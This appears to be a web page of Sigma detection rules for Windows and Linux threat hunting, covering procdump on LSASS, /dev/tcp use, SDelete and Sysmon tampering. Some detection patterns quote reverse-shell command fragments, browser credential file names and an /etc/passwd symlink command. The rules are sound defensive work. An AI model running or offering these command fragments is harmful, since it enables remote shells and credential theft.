<li><a href="#">title:Suspicious Unblock-File id: 5947497f-1aa4-41dd-9693-c9848d58727d status: experimental description: Remove the Zone.Identifier alternate data stream which identifies the file as downloaded from the internet. date: 2022/02/01 author: frack113 references: - - logsource: product: windows category: ps_script definition: Script block logging must be enabled detection: selection: ScriptBlockText|contains|all: - 'Unblock-File ' - '-Path ' condition: selection falsepositives: - Legitimate PowerShell scripts level: medium tags: - attack.defense_evasion - attack.t1553.005 
<li><a href="#">title:Suspicious Usage of the Manage-bde.wsf Script id: c363385c-f75d-4753-a108-c1a8e28bdbda description: Detects a usage of the manage-bde.wsf script that may indicate an attempt of proxy execution from script status: experimental references: - - - - - tags: - attack.defense_evasion - attack.t1216 date: 2020/10/13 modified: 2021/05/21 author: oscd.community, Natalia Shornikova logsource: category: process_creation product: windows detection: selection: CommandLine|contains|all: - 'cscript' - 'manage-bde.wsf' condition: selection falsepositives: - Unknown level: medium 
<li><a href="#">title:Suspicious Use of /dev/tcp id: 6cc5fceb-9a71-4c23-aeeb-963abe0b279c status: experimental description: Detects suspicious command with /dev/tcp author: frack113 references: - - - date: 2021/12/10 modified: 2022/01/10 logsource: product: linux detection: keyword: - 'cat </dev/tcp/' - 'exec 3<>/dev/tcp/' - 'echo >/dev/tcp/' - 'bash -i >& /dev/tcp/' - 'sh -i >& /dev/udp/' - '0<&196;exec 196<>/dev/tcp/' - 'exec 5<>/dev/tcp/' - '(sh)0>/dev/tcp/' - 'bash -c ''bash -i >& /dev/tcp/' - 'echo -e ''#!/bin/bash\nbash -i >& /dev/tcp/' condition: 1 of keyword falsepositives: - Unknown level: medium tags: - attack.reconnaissance 
<li><a href="#">title:Suspicious Use of CSharp Interactive Console id: a9e416a8-e613-4f8b-88b8-a7d1d1af2f61 status: test description: Detects the execution of CSharp interactive console by PowerShell author: Michael R. (@nahamike01) references: - date: 2020/03/08 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: Image|endswith: '\csi.exe' ParentImage|endswith: '\powershell.exe' OriginalFileName: 'csi.exe' condition: selection falsepositives: - Possible depending on environment. Pair with other factors such as net connections, command-line args, etc. level: high tags: - attack.execution - attack.t1127 
<li><a href="#">title:Suspicious Use of Procdump id: 03795938-1387-481b-9f4c-3f6241e604fe description: Detects suspicious uses of the SysInternals Procdump utility by using a special command line parameter ' -ma ' and ' -accepteula' in a single step. This way we're also able to catch cases in which the attacker has renamed the procdump executable. status: experimental references: - Internal Research author: Florian Roth date: 2021/02/02 modified: 2021/08/16 tags: - attack.defense_evasion - attack.t1036 - attack.t1003.001 logsource: category: process_creation product: windows detection: selection: CommandLine|contains|all: - ' -ma ' - ' -accepteula ' condition: selection falsepositives: - Another tool that uses the command line switches of Procdump - Legitimate use of procdump by a developer or administrator level: high 
<li><a href="#">title:Suspicious Use of Procdump on LSASS id: 5afee48e-67dd-4e03-a783-f74259dcf998 description: Detects suspicious uses of the SysInternals Procdump utility by using a special command line parameter in combination with the lsass.exe process. This way we're also able to catch cases in which the attacker has renamed the procdump executable. status: stable references: - Internal Research author: Florian Roth date: 2018/10/30 modified: 2021/02/02 tags: - attack.defense_evasion - attack.t1036 - attack.credential_access - attack.t1003.001 - car.2013-05-009 logsource: category: process_creation product: windows detection: selection1: CommandLine|contains: ' -ma ' selection2: CommandLine|contains: ' lsass' selection3: CommandLine|contains|all: - ' -ma ' - ' ls' condition: ( selection1 and selection2 ) or selection3 falsepositives: - Unlikely, because no one should dump an lsass process memory - Another tool that uses the command line switches of Procdump level: high 
<li><a href="#">title:Suspicious Use of PsLogList id: aae1243f-d8af-40d8-ab20-33fc6d0c55bc description: Threat actors can use the PsLogList utility to dump event log in order to extract admin accounts and perform account discovery. status: experimental references: - - - author: Nasreddine Bencherchali @nas_bench date: 2021/12/18 modified: 2022/06/16 tags: - attack.discovery - attack.t1087 - attack.t1087.001 - attack.t1087.002 logsource: category: process_creation product: windows detection: selection_img: - OriginalFileName: 'psloglist.exe' - Image|endswith: - '\psloglist.exe' - '\psloglist64.exe' selection_flgs: CommandLine|contains|all: - 'security' - 'accepteula' CommandLine|contains: - ' -d' - ' /d' - ' -x' - ' /x' - ' -s' - ' /s' condition: 1 of selection* falsepositives: - Another tool that uses the command line switches of PsLogList - Legitimate use of PsLogList by an administrator level: medium 
<li><a href="#">title:Suspicious User Agent id: 7195a772-4b3f-43a4-a210-6a003d65caa1 status: experimental description: Detects suspicious malformed user agent strings in proxy logs author: Florian Roth date: 2017/07/08 modified: 2022/05/06 references: - logsource: category: proxy detection: selection1: c-useragent|startswith: - 'user-agent' # User-Agent: User-Agent: - 'Mozilla/3.0 ' - 'Mozilla/2.0 ' - 'Mozilla/1.0 ' - 'Mozilla ' # missing slash - ' Mozilla/' # leading space - 'Mozila/' # single 'l' - 'Mozilla/4.0 (compatible; MSIE 6.0; MS Web Services Client Protocol' # selection2: c-useragent|contains: - ' (compatible;MSIE ' # typical typo - missing space - '.0;Windows NT ' # typical typo - missing space - 'loader' # selection3: c-useragent: - '_' - 'CertUtil URL Agent' # - 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:60.0)' # CobaltStrike Beacon - 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:28.0) Gecko/20100101 Firefox/28.0' # used by APT28 malware - 'HTTPS' # falsepositives: c-useragent: 'Mozilla/3.0 * Acrobat *' # Acrobat with linked content condition: ( selection1 or selection2 or selection3 ) and not falsepositives fields: - ClientIP - c-uri - c-useragent falsepositives: - Unknown level: high tags: - attack.command_and_control - attack.t1071.001 
<li><a href="#">title:Suspicious Userinit Child Process id: b655a06a-31c0-477a-95c2-3726b83d649d status: experimental description: Detects a suspicious child process of userinit references: - author: Florian Roth (rule), Samir Bousseaden (idea) date: 2019/06/17 modified: 2021/06/29 logsource: category: process_creation product: windows detection: selection: ParentImage|endswith: '\userinit.exe' filter1: CommandLine|contains: '\netlogon\' filter2: - Image|endswith: '\explorer.exe' - ImageFileName: 'explorer.exe' condition: selection and not filter1 and not filter2 fields: - CommandLine - ParentCommandLine falsepositives: - Administrative scripts level: medium tags: - attack.defense_evasion - attack.t1055 
<li><a href="#">title:Suspicious VBoxDrvInst.exe Parameters id: b7b19cb6-9b32-4fc4-a108-73f19acfe262 status: test description: Detect VBoxDrvInst.exe run with parameters allowing processing INF file. This allows to create values in the registry and install drivers. For example one could use this technique to obtain persistence via modifying one of Run or RunOnce registry keys author: Konstantin Grishchenko, oscd.community references: - - date: 2020/10/06 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: Image|endswith: '\VBoxDrvInst.exe' CommandLine|contains|all: - 'driver' - 'executeinf' condition: selection fields: - ComputerName - User - CommandLine - ParentCommandLine falsepositives: - Legitimate use of VBoxDrvInst.exe utility by VirtualBox Guest Additions installation process level: medium tags: - attack.defense_evasion - attack.t1112 
<li><a href="#">title:Suspicious VBScript UN2452 Pattern id: 20c3f09d-c53d-4e85-8b74-6aa50e2f1b61 description: Detects suspicious inline VBScript keywords as used by UNC2452 status: experimental references: - author: Florian Roth date: 2021/03/05 logsource: category: process_creation product: windows detection: selection: CommandLine|contains|all: - 'Execute' - 'CreateObject' - 'RegRead' - 'window.close' - '\Microsoft\Windows\CurrentVersion' filter: CommandLine|contains: '\Software\Microsoft\Windows\CurrentVersion\Run' condition: selection and not filter falsepositives: - Unknown level: high tags: - attack.persistence - attack.t1547.001 
<li><a href="#">title:Suspicious VHD Image Download From Browser id: 8468111a-ef07-4654-903b-b863a80bbc95 status: test description: Malware can use mountable Virtual Hard Disk .vhd file to encapsulate payloads and evade security controls references: - - - author: frack113, Christopher Peacock '@securepeacock', SCYTHE '@scythe_io' date: 2021/10/25 modified: 2022/06/02 tags: - attack.resource_development - attack.t1587.001 logsource: category: file_event product: windows definition: in sysmon add "<TargetFilename condition="end with">.vhd</TargetFilename> <!--vhd files for ZLoader and lazarus malware vectors -->" detection: selection: Image|endswith: - '\chrome.exe' - '\firefox.exe' - '\microsoftedge.exe' - '\microsoftedgecp.exe' - '\msedge.exe' - '\iexplorer.exe' - '\brave.exe' - '\opera.exe' TargetFilename|contains: '.vhd' #not endswith to get the alternate data stream log Too TargetFilename: C:\Users\Frack113\Downloads\windows.vhd:Zone.Identifier condition: selection falsepositives: - Legitimate user creation level: medium 
<li><a href="#">title:Suspicious VSFTPD Error Messages id: 377f33a1-4b36-4ee1-acee-1dbe4b43cfbe status: test description: Detects suspicious VSFTPD error messages that indicate a fatal or suspicious error that could be caused by exploiting attempts author: Florian Roth references: - date: 2017/07/05 modified: 2021/11/27 logsource: product: linux service: vsftpd detection: keywords: - 'Connection refused: too many sessions for this address.' - 'Connection refused: tcp_wrappers denial.' - 'Bad HTTP verb.' - 'port and pasv both active' - 'pasv and port both active' - 'Transfer done (but failed to open directory).' - 'Could not set file modification time.' - 'bug: pid active in ptrace_sandbox_free' - 'PTRACE_SETOPTIONS failure' - 'weird status:' - 'couldn''t handle sandbox event' - 'syscall * out of bounds' - 'syscall not permitted:' - 'syscall validate failed:' - 'Input line too long.' - 'poor buffer accounting in str_netfd_alloc' - 'vsf_sysutil_read_loop' condition: keywords falsepositives: - Unknown level: medium tags: - attack.initial_access - attack.t1190 
<li><a href="#">title:Suspicious WebDav Client Execution id: 2dbd9d3d-9e27-42a8-b8df-f13825c6c3d5 status: test description: A General detection for svchost.exe spawning rundll32.exe with command arguments like C:\windows\system32\davclnt.dll,DavSetCookie. This could be an indicator of exfiltration or use of WebDav to launch code (hosted on WebDav Server). author: Roberto Rodriguez (Cyb3rWard0g), OTR (Open Threat Research) references: - - date: 2020/05/02 modified: 2022/05/13 logsource: category: process_creation product: windows detection: selection_img: - Image|endswith: '\rundll32.exe' - OriginalFileName: 'RUNDLL32.EXE' selection_cli: CommandLine|contains: 'C:\windows\system32\davclnt.dll,DavSetCookie' condition: all of selection* falsepositives: - Unknown level: medium tags: - attack.exfiltration - attack.t1048.003 
<li><a href="#">title:Suspicious WebDav Client Execution id: bb76d96b-821c-47cf-944b-7ce377864492 status: experimental description: Detects a privilege elevation attempt by coercing NTLM authentication on the Printer Spooler service author: Elastic (idea), Tobias Michalski references: - - date: 2022/05/04 tags: - attack.privilege_escalation - attack.credential_access - attack.t1212 logsource: category: process_creation product: windows detection: selection: Image|endswith: '\rundll32.exe' CommandLine|contains|all: - 'C:\windows\system32\davclnt.dll,DavSetCookie' - 'http' CommandLine|contains: - 'spoolss' - 'srvsvc' - '/print/pipe/' condition: selection falsepositives: - Unknown level: high 
<li><a href="#">title:Suspicious Where Execution id: 725a9768-0f5e-4cb3-aec2-bc5719c6831a status: experimental description: | Adversaries may enumerate browser bookmarks to learn more about compromised hosts. Browser bookmarks may reveal personal information about users (ex: banking sites, interests, social media, etc.) as well as details about internal network resources such as servers, tools/dashboards, or other related infrastructure. references: - author: frack113, Nasreddine Bencherchali date: 2021/12/13 modified: 2022/06/29 logsource: category: process_creation product: windows detection: where_exe: - Image|endswith: '\where.exe' - OriginalFileName: 'where.exe' where_opt: CommandLine|contains: # Firefox Data - 'places.sqlite' - 'cookies.sqlite' - 'formhistory.sqlite' - 'logins.json' - 'key4.db' - 'key3.db' - 'sessionstore.jsonlz4' # Chrome Data - 'History' - 'Bookmarks' - 'Cookies' - 'Login Data' condition: all of where_* falsepositives: - Unknown level: low tags: - attack.discovery - attack.t1217 
<li><a href="#">title:Suspicious Windows ANONYMOUS LOGON Local Account Created id: 1bbf25b9-8038-4154-a50b-118f2a32be27 status: experimental description: Detects the creation of suspicious accounts similar to ANONYMOUS LOGON, such as using additional spaces. Created as an covering detection for exclusion of Logon Type 3 from ANONYMOUS LOGON accounts. references: - author: James Pemberton / @4A616D6573 date: 2019/10/31 modified: 2021/07/06 tags: - attack.persistence - attack.t1136.001 - attack.t1136.002 logsource: product: windows service: security detection: selection: EventID: 4720 SamAccountName|contains|all: - 'ANONYMOUS' - 'LOGON' condition: selection falsepositives: - Unknown level: high 
<li><a href="#">title:Suspicious Windows Strings In URI id: 9f6a34b4-2688-4eb7-a7f5-e39fef573d0e status: experimental description: Detects suspicious windows strins in URI which could indicate possible exfiltration or webshell communication author: Nasreddine Bencherchali date: 2022/06/06 references: - logsource: category: webserver detection: selection: c-uri|contains: - '=C:/Users' - '=C:/Program%20Files' - '=C:/Windows' - '=C%3A%5CUsers' - '=C%3A%5CProgram%20Files' - '=C%3A%5CWindows' condition: selection falsepositives: - Legitimate application and websites that use windows paths in their URL level: high tags: - attack.persistence - attack.exfiltration - attack.t1505.003 
<li><a href="#">title:Suspicious Windows Update Agent Empty Cmdline id: 52d097e2-063e-4c9c-8fbb-855c8948d135 status: experimental description: Detects suspicious Windows Update Agent activity in which a wuauclt.exe process command line doesn't contain any command line flags author: Florian Roth references: - date: 2022/02/26 modified: 2022/05/13 logsource: category: process_creation product: windows detection: selection_img: - Image|endswith: '\Wuauclt.exe' - OriginalFileName: 'Wuauclt.exe' selection_cli: CommandLine|endswith: '\Wuauclt.exe' condition: all of selection* falsepositives: - Unknown level: high 
<li><a href="#">title:Suspicious WMI Execution id: 526be59f-a573-4eea-b5f7-f0973207634d status: test description: Detects WMI executing suspicious commands author: Michael Haag, Florian Roth, juju4, oscd.community references: - - - date: 2019/01/16 modified: 2022/05/13 logsource: category: process_creation product: windows detection: selection: - Image|endswith: '\wmic.exe' - OriginalFileName: 'wmic.exe' selection2: CommandLine|contains|all: - 'process' - 'call' - 'create ' recon_part1: CommandLine|contains: ' path ' recon_part2: CommandLine|contains: - 'AntiVirus' - 'Firewall' CommandLine|contains|all: - 'Product' - ' get ' condition: (selection and selection2) or (selection and recon_part1 and recon_part2) fields: - CommandLine - ParentCommandLine falsepositives: - If using Splunk, we recommend | stats count by Computer,CommandLine following for easy hunting by Computer/CommandLine level: medium tags: - attack.execution - attack.t1047 - car.2016-03-002 
<li><a href="#">title:Suspicious WMI Execution Using Rundll32 id: 3c89a1e8-0fba-449e-8f1b-8409d6267ec8 status: test description: Detects WMI executing rundll32 author: Florian Roth references: - date: 2020/10/12 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: CommandLine|contains|all: - 'process call create' - 'rundll32' condition: selection fields: - CommandLine - ParentCommandLine falsepositives: - Unknown level: high tags: - attack.execution - attack.t1047 
<li><a href="#">title:Suspicious WMI Reconnaissance id: 221b251a-357a-49a9-920a-271802777cc0 status: experimental description: An adversary might use WMI to list Processes running on the compromised host or list installed Software hotfix and patches. author: frack113 references: - - date: 2022/01/01 modified: 2022/05/13 logsource: category: process_creation product: windows detection: selection_img: - Image|endswith: \WMIC.exe - OriginalFileName: 'wmic.exe' selection_cli: CommandLine|contains: - process - qfe filter: CommandLine|contains|all: #rule id 526be59f-a573-4eea-b5f7-f0973207634d for `wmic process call create #{process_to_execute}` - call - create condition: all of selection* and not filter falsepositives: - Unknown level: medium tags: - attack.execution - attack.t1047 
<li><a href="#">title:Suspicious WMIC ActiveScriptEventConsumer Creation id: ebef4391-1a81-4761-a40a-1db446c0e625 status: experimental description: Detects WMIC executions in which a event consumer gets created in order to establish persistence references: - - author: Florian Roth date: 2021/06/25 logsource: category: process_creation product: windows detection: selection: CommandLine|contains|all: - 'ActiveScriptEventConsumer' - ' CREATE ' condition: selection fields: - CommandLine - ParentCommandLine tags: - attack.persistence - attack.t1546.003 falsepositives: - Legitimate software creating script event consumers level: high 
<li><a href="#">title:Suspicious Word Cab File Write CVE-2021-40444 id: 60c0a111-787a-4e8a-9262-ee485f3ef9d5 description: Detects file creation patterns noticeable during the exploitation of CVE-2021-40444 status: experimental references: - - author: Florian Roth, Sittikorn S date: 2021/09/10 modified: 2022/06/17 logsource: product: windows category: file_event detection: selection_cab: Image|endswith: '\winword.exe' TargetFilename|endswith: '.cab' TargetFilename|contains: '\Windows\INetCache' selection_inf: Image|endswith: '\winword.exe' TargetFilename|contains|all: - '\AppData\Local\Temp\' - '.inf' filter_legit: TargetFilename|startswith: 'C:\Users\' TargetFilename|contains: 'AppData\Local\Temp' TargetFilename|endswith: '\Content.inf' condition: (selection_cab or selection_inf) and not filter_legit fields: - TargetFilename falsepositives: - Unknown level: high tags: - attack.resource_development - attack.t1587 
<li><a href="#">title:Suspicious Workstation Locking via Rundll32 id: 3b5b0213-0460-4e3f-8937-3abf98ff7dcc description: Detects a suspicious call to the user32.dll function that locks the user workstation status: experimental references: - author: frack113 date: 2022/06/04 logsource: category: process_creation product: windows detection: selection_call: Image|endswith: '\rundll32.exe' ParentImage|endswith: '\cmd.exe' CommandLine|contains: 'user32.dll,' selection_function: CommandLine|contains: 'LockWorkStation' condition: all of selection* fields: - Image - ParentImage falsepositives: - Scritps or links on the user desktop used to lock the workstation instead of Windows+L or the menu option level: medium tags: - attack.defense_evasion 
<li><a href="#">title:Suspicious WSMAN Provider Image Loads id: ad1f4bb9-8dfb-4765-adb6-2a7cfb6c0f94 description: Detects signs of potential use of the WSMAN provider from uncommon processes locally and remote execution. status: experimental date: 2020/06/24 modified: 2022/02/21 author: Roberto Rodriguez (Cyb3rWard0g), OTR (Open Threat Research) tags: - attack.execution - attack.t1059.001 - attack.lateral_movement - attack.t1021.003 references: - - - - logsource: category: image_load product: windows detection: request_client: - ImageLoaded|endswith: - '\WsmSvc.dll' - '\WsmAuto.dll' - '\Microsoft.WSMan.Management.ni.dll' - OriginalFileName: - WsmSvc.dll - WSMANAUTOMATION.DLL - Microsoft.WSMan.Management.dll respond_server: Image|endswith: '\svchost.exe' OriginalFileName: 'WsmWmiPl.dll' filter_general: Image|endswith: - '\powershell.exe' - 'C:\Windows\System32\sdiagnhost.exe' - 'C:\Windows\System32\services.exe' filter_svchost: # not available in Sysmon data, but Aurora logs CommandLine|contains: - 'svchost.exe -k netsvcs -p -s BITS' - 'svchost.exe -k GraphicsPerfSvcGroup -s GraphicsPerfSvc' - 'svchost.exe -k NetworkService -p -s Wecsvc' - 'svchost.exe -k netsvcs' filter_mscorsvw: #Image: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\mscorsvw.exe Image|startswith: - C:\Windows\Microsoft.NET\Framework64\v - C:\Windows\Microsoft.NET\Framework\v Image|endswith: \mscorsvw.exe filter_svr_2019: Image: - 'C:\Windows\System32\Configure-SMRemoting.exe' - 'C:\Windows\System32\ServerManager.exe' filter_nextron: Image|startswith: 'C:\Windows\Temp\asgard2-agent\' filter_citrix: Image|startswith: 'C:\Program Files\Citrix\' condition: ( request_client or respond_server ) and not 1 of filter* falsepositives: - Unknown level: medium 
<li><a href="#">title:Suspicious XOR Encoded PowerShell Command Line id: 812837bb-b17f-45e9-8bd0-0ec35d2e3bd6 description: Detects suspicious powershell process which includes bxor command, alternative obfuscation method to b64 encoded commands. status: experimental author: Teymur Kheirkhabarov, Harish Segar (rule) date: 2020/06/29 modified: 2021/10/16 tags: - attack.execution - attack.t1059.001 logsource: product: windows category: ps_classic_start definition: fields have to be extract from event detection: selection: HostName: 'ConsoleHost' filter: HostApplication|contains: - 'bxor' - 'join' - 'char' condition: selection and filter falsepositives: - Unknown level: medium 
<li><a href="#">title:Suspicious XOR Encoded PowerShell Command Line id: bb780e0c-16cf-4383-8383-1e5471db6cf9 status: test description: Detects suspicious powershell process which includes bxor command, alternative obfuscation method to b64 encoded commands. author: Sami Ruohonen, Harish Segar (improvement), Tim Shelton date: 2018/09/05 modified: 2022/01/10 logsource: category: process_creation product: windows detection: selection: - Description: 'Windows PowerShell' - Product: 'PowerShell Core 6' filter: CommandLine|contains: - 'bxor' - '-join ' - '-join''' - '-join"' - '-join`' - 'char' false_positives: ParentImage: C:\Program Files\Amazon\SSM\ssm-document-worker.exe condition: selection and filter and not false_positives falsepositives: - Unknown level: medium tags: - attack.defense_evasion - attack.t1059.001 - attack.t1140 - attack.t1027 
<li><a href="#">title:Suspicious ZipExec Execution id: 90dcf730-1b71-4ae7-9ffc-6fcf62bd0132 status: experimental description: ZipExec is a Proof-of-Concept (POC) tool to wrap binary-based tools into a password-protected zip file. references: - - tags: - attack.execution - attack.defense_evasion - attack.t1218 - attack.t1202 author: frack113 date: 2021/11/07 logsource: category: process_creation product: windows detection: run: CommandLine|contains|all: - '/generic:Microsoft_Windows_Shell_ZipFolder:filename=' - '.zip' - '/pass:' - '/user:' delete: CommandLine|contains|all: - '/delete' - 'Microsoft_Windows_Shell_ZipFolder:filename=' - '.zip' condition: run or delete falsepositives: - Unknown level: medium 
<li><a href="#">title:Suspicius Schtasks From Env Var Folder id: 81325ce1-be01-4250-944f-b4789644556f description: Detects Schtask creations that point to a folder references in environment variables or often used by malware status: experimental references: - - tags: - attack.execution - attack.t1053.005 author: Florian Roth date: 2022/02/21 modified: 2022/03/11 logsource: product: windows category: process_creation detection: selection1_create: Image|endswith: '\schtasks.exe' CommandLine|contains: ' /create ' selection1_all_folders: CommandLine|contains: - '%AppData%' - '\AppData\Local\' - '\AppData\Roaming\' - '%Public%' - '\Users\Public' - 'C:\Windows\Temp' - 'C:\Perflogs' selection2_parent: ParentCommandLine|endswith: '\svchost.exe -k netsvcs -p -s Schedule' selection2_some_folders: CommandLine|contains: - '%Public%' - '\Users\Public' - 'C:\Windows\Temp' - 'C:\Perflogs' filter_mixed: - CommandLine|contains: 'update_task.xml' - ParentCommandLine|contains: 'unattended.ini' condition: ( all of selection1* or all of selection2* ) and not 1 of filter* falsepositives: - Benign scheduled tasks creations or executions that happen often during software installations - Software that uses the AppData folder and scheduled tasks to update the software in the AppData folders level: high 
<li><a href="#">title:SVCHOST Credential Dump id: 174afcfa-6e40-4ae9-af64-496546389294 description: Detects when a process, such as mimikatz, accesses the memory of svchost to dump credentials status: experimental date: 2021/04/30 author: Florent Labouyrie logsource: product: windows category: process_access tags: - attack.t1548 detection: selection_process: TargetImage|endswith: '\svchost.exe' selection_memory: GrantedAccess: '0x143a' filter_trusted_process_access: SourceImage|endswith: - '*\services.exe' - '*\msiexec.exe' condition: selection_process and selection_memory and not filter_trusted_process_access falsepositives: - Non identified legit exectubale level: high 
<li><a href="#">title:Svchost DLL Search Order Hijack id: 602a1f13-c640-4d73-b053-be9a2fa58b77 status: test description: IKEEXT and SessionEnv service, as they call LoadLibrary on files that do not exist within C:\Windows\System32\ by default. An attacker can place their malicious logic within the PROCESS_ATTACH block of their library and restart the aforementioned services "svchost.exe -k netsvcs" to gain code execution on a remote machine. author: SBousseaden references: - date: 2019/10/28 modified: 2021/11/27 logsource: category: image_load product: windows detection: selection: Image|endswith: '\svchost.exe' ImageLoaded|endswith: - '\tsmsisrv.dll' - '\tsvipsrv.dll' - '\wlbsctrl.dll' filter: ImageLoaded|startswith: 'C:\Windows\WinSxS\' condition: selection and not filter falsepositives: - Unknown level: high tags: - attack.persistence - attack.defense_evasion - attack.t1574.002 - attack.t1574.001 
<li><a href="#">title:Symlink Etc Passwd id: c67fc22a-0be5-4b4f-aad5-2b32c4b69523 status: test description: Detects suspicious command lines that look as if they would create symbolic links to /etc/passwd author: Florian Roth references: - date: 2019/04/05 modified: 2021/11/27 logsource: product: linux detection: keywords: - 'ln -s -f /etc/passwd' - 'ln -s /etc/passwd' condition: keywords falsepositives: - Unknown level: high tags: - attack.t1204.001 - attack.execution 
<li><a href="#">title:SyncAppvPublishingServer Execute Arbitrary PowerShell Code id: fbd7c32d-db2a-4418-b92c-566eb8911133 related: - id: fde7929d-8beb-4a4c-b922-be9974671667 type: obsoletes status: experimental author: frack113 date: 2021/07/12 modified: 2021/09/12 description: Executes arbitrary PowerShell code using SyncAppvPublishingServer.exe. references: - - tags: - attack.defense_evasion - attack.t1218 logsource: category: process_creation product: windows detection: selection: Image|endswith: '\SyncAppvPublishingServer.exe' CommandLine|contains: '"n; ' condition: selection fields: - ComputerName - User - CommandLine - ParentCommandLine falsepositives: - App-V clients level: medium 
<li><a href="#">title:SyncAppvPublishingServer Execution to Bypass Powershell Restriction id: dddfebae-c46f-439c-af7a-fdb6bde90218 related: - id: fde7929d-8beb-4a4c-b922-be9974671667 type: derived - id: 9f7aa113-9da6-4a8d-907c-5f1a4b908299 type: derived description: Detects SyncAppvPublishingServer process execution which usually utilized by adversaries to bypass PowerShell execution restrictions. status: experimental references: - author: 'Ensar Åžamil, @sblmsrsn, OSCD Community' date: 2020/10/05 modified: 2021/10/18 tags: - attack.defense_evasion - attack.t1218 logsource: product: windows category: ps_script detection: selection: ScriptBlockText|contains: 'SyncAppvPublishingServer.exe' condition: selection falsepositives: - App-V clients level: medium 
<li><a href="#">title:SyncAppvPublishingServer Execution to Bypass Powershell Restriction id: fe5ce7eb-dad8-467c-84a9-31ec23bd644a related: - id: fde7929d-8beb-4a4c-b922-be9974671667 type: derived - id: 9f7aa113-9da6-4a8d-907c-5f1a4b908299 type: derived description: Detects SyncAppvPublishingServer process execution which usually utilized by adversaries to bypass PowerShell execution restrictions. status: experimental references: - author: 'Ensar Åžamil, @sblmsrsn, OSCD Community' date: 2020/10/05 modified: 2021/10/18 tags: - attack.defense_evasion - attack.t1218 logsource: product: windows category: ps_module detection: selection: ContextInfo|contains: 'SyncAppvPublishingServer.exe' condition: selection falsepositives: - App-V clients level: medium 
<li><a href="#">title:SyncAppvPublishingServer VBS Execute Arbitrary PowerShell Code id: 36475a7d-0f6d-4dce-9b01-6aeb473bbaf1 status: experimental author: frack113 date: 2021/07/16 modified: 2022/06/22 description: Executes arbitrary PowerShell code using SyncAppvPublishingServer.vbs references: - - tags: - attack.defense_evasion - attack.t1218 - attack.t1216 logsource: category: process_creation product: windows detection: selection: CommandLine|contains|all: - '\SyncAppvPublishingServer.vbs' - ';' # at a minimum, a semi-colon is required condition: selection fields: - ComputerName - User - CommandLine - ParentCommandLine falsepositives: - Unknown level: medium 
<li><a href="#">title:Sysinternals SDelete Delete File id: a4824fca-976f-4964-b334-0621379e84c4 status: experimental author: frack113 date: 2021/06/03 description: Use of SDelete to erase a file not the free space references: - tags: - attack.impact - attack.t1485 logsource: category: process_creation product: windows detection: selection: OriginalFileName: sdelete.exe filter: CommandLine|contains: - ' -h' - ' -c' - ' -z' - ' /?' condition: selection and not filter fields: - ComputerName - User - CommandLine - ParentCommandLine falsepositives: - System administrator Usage level: medium 
<li><a href="#">title:Sysinternals SDelete File Deletion id: 6ddab845-b1b8-49c2-bbf7-1a11967f64bc status: test description: A General detection to trigger for the deletion of files by Sysinternals SDelete. It looks for the common name pattern used to rename files. author: Roberto Rodriguez (Cyb3rWard0g), OTR (Open Threat Research) references: - - date: 2020/05/02 modified: 2021/11/27 logsource: product: windows category: file_delete detection: selection: TargetFilename|endswith: - '.AAA' - '.ZZZ' condition: selection falsepositives: - Legitime usage of SDelete level: medium tags: - attack.defense_evasion - attack.t1070.004 
<li><a href="#">title:Sysinternals SDelete Registry Keys id: 9841b233-8df8-4ad7-9133-b0b4402a9014 description: A General detection to trigger for the creation or modification of .*\Software\Sysinternals\SDelete registry keys. Indicators of the use of Sysinternals SDelete tool. status: experimental date: 2020/05/02 modified: 2022/06/26 author: Roberto Rodriguez (Cyb3rWard0g), OTR (Open Threat Research) references: - - logsource: product: windows category: registry_add detection: selection: EventType: CreateKey TargetObject|contains: '\Software\Sysinternals\SDelete' condition: selection falsepositives: - Unknown level: medium tags: - attack.defense_evasion - attack.t1070.004 
<li><a href="#">title:SysKey Registry Keys Access id: 9a4ff3b8-6187-4fd2-8e8b-e0eae1129495 status: test description: Detects handle requests and access operations to specific registry keys to calculate the SysKey author: Roberto Rodriguez @Cyb3rWard0g references: - date: 2019/08/12 modified: 2021/11/27 logsource: product: windows service: security detection: selection: EventID: - 4656 - 4663 ObjectType: 'key' ObjectName|endswith: - 'lsa\JD' - 'lsa\GBG' - 'lsa\Skew1' - 'lsa\Data' condition: selection falsepositives: - Unknown level: high tags: - attack.discovery - attack.t1012 
<li><a href="#">title:Sysmon Channel Reference Deletion id: 18beca67-ab3e-4ee3-ba7a-a46ca8d7d0cc status: test description: Potential threat actor tampering with Sysmon manifest and eventually disabling it author: Roberto Rodriguez (Cyb3rWard0g), OTR (Open Threat Research) references: - - - - date: 2020/07/14 modified: 2021/11/27 logsource: product: windows service: security detection: selection1: EventID: 4657 ObjectName|contains: - 'WINEVT\Publishers\{5770385f-c22a-43e0-bf4c-06f5698ffbd9}' - 'WINEVT\Channels\Microsoft-Windows-Sysmon/Operational' ObjectValueName: 'Enabled' NewValue: '0' selection2: EventID: 4663 ObjectName|contains: - 'WINEVT\Publishers\{5770385f-c22a-43e0-bf4c-06f5698ffbd9}' - 'WINEVT\Channels\Microsoft-Windows-Sysmon/Operational' AccessMask: 0x10000 condition: selection1 or selection2 falsepositives: - Unknown level: high tags: - attack.defense_evasion - attack.t1112 
<li><a href="#">title:Sysmon Configuration Change id: 8ac03a65-6c84-4116-acad-dc1558ff7a77 description: Detects a Sysmon configuration change, which could be the result of a legitimate reconfiguration or someone trying manipulate the configuration status: experimental author: frack113 date: 2022/01/12 references: - logsource: product: windows service: sysmon detection: selection: EventID: 16 # To avoid FP just add # filter: # ConfigurationFileHash: 'SHA256=The_Hash_Of_Your_Valid_Config_XML' # condition: selection and not filter condition: selection falsepositives: - Legitimate administrative action level: medium tags: - attack.defense_evasion 
<li><a href="#">title:Sysmon Configuration Error id: 815cd91b-7dbc-4247-841a-d7dd1392b0a8 description: Someone try to hide from Sysmon status: experimental author: frack113 date: 2021/06/04 modified: 2022/04/04 references: - - tags: - attack.defense_evasion - attack.t1564 logsource: product: windows category: sysmon_error detection: selection_error: Description|contains: - 'Failed to open service configuration with error' - 'Failed to connect to the driver to update configuration' filter_generic_english: Description|contains|all: - 'Failed to open service configuration with error' - 'Last error: The media is write protected.' filter_by_errorcode: Description|contains: - 'Failed to open service configuration with error 19' - 'Failed to open service configuration with error 93' condition: selection_error and not 1 of filter* falsepositives: - Legitimate administrative action level: high 
